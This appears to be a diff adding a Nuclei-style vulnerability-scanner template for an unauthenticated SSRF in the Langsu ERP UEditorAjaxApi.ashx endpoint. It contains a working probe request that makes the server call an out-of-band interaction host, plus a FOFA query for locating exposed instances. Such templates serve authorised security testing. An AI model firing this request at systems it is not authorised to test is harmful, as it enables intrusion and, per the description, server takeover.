@@ -1,0 +1,37 @@
+id: lserp-UEditorAjaxApi-ssrf
+info:
+  name: 朗速 ERP 系统 UEditorAjaxApi - ssrf
+  author: leadlife
+  severity: high
+  description: 朗速ERP UEditorAjaxApi.ashx 接口存在SSRF漏洞,未经身份验证的远程攻击者可以利用该漏洞在VPS上构造恶意文件，使服务器访问并下载文件到本地，进而控制服务器权限
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%9C%97%E9%80%9FERP/%E6%9C%97%E9%80%9FERP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3UEditorAjaxApi.ashx%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
+  tags: 2025,lserp,ssrf,oob
+
+http:
+  - raw:
+      - |
+        POST /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br, zstd
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        Connection: keep-alive
+
+        source[]=http://{{interactsh-url}}
+
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
